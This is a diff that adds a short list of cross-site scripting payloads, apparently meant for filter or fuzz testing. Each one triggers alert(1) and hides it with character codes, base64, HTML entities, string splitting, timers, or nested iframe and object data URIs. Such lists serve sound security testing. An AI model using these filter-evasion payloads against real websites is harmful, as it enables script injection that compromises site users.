@@ -1,0 +1,12 @@
+<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)>
+<iframe srcdoc='<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></object>'>
+<svg onload=window[atob('YWxlcnQ=')](1)></svg>
+<svg onload=&#97;&#x6c;&#x65;&#x72;&#x74;(1)></svg>
+<object data="data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=="></object>
+<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9c2V0VGltZW91dCgnYWxlcnQoMSknKTs+"></object>
+<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',0)>
+<svg onload=setInterval('al'+'ert(1)',1000)></svg>
+<iframe srcdoc='<object data="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></object>'></iframe>
+<svg onload=window['a'+'l'+'ert'](1)></svg>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<iframe srcdoc='<svg onload=window["al"+"ert"](1)>'></iframe>
